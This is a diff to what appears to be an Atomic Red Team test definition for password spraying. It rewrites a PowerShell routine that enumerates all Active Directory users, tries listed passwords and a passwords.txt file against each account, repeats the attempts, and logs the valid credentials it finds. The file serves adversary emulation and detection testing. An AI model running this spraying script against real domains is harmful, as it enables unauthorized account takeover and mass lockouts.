@@ -9,7 +9,7 @@ atomic_tests:
   - windows
   input_arguments:
     passwords:
-      description: Path to a file containing a list of passwords we will attempt to brute force with
+      description: list of passwords we will attempt to brute force with
       type: String
       default: Pa`$`$w0rd`n123456`npassword
     domain:
@@ -20,15 +20,28 @@ atomic_tests:
       description: Path to bruteforce output 
       type: Path
       default: C:\Windows\Temp\tmp.txt
+    number_of_attempts:
+      description: Number of password spraying attempts 
+      type: String
+      default: 2
   executor:
     name: powershell
     command: |
       $DomainUsers = Get-ADUser -Filter * | Select-Object -Property SamAccountName
       $passwords = "#{passwords}".split("`n")
-      $DomainUsers | Foreach-Object {
-        foreach ($password in $passwords){
-          if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
-            "[!] $($_.SamAccountName):$password found on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+      for ($i = 0; $i -lt #{number_of_attempts}; $i++) {
+        $DomainUsers | Foreach-Object {
+          foreach ($password in $passwords){
+            "[-] Attempting $password on account $($_.SamAccountName)." | Out-File -FilePath #{output_file} -Append
+            if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
+              "[!] $($_.SamAccountName):$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+            }
+          }
+          foreach ($password in Get-Content 'C:\AtomicRedTeam\atomics\T1110.003\passwords.txt' ) {
+            "[-] Attempting $password on account $($_.SamAccountName)." | Out-File -FilePath #{output_file} -Append
+            if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
+              "[!] $($_.SamAccountName):$password are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+            }
           }
         }
       }
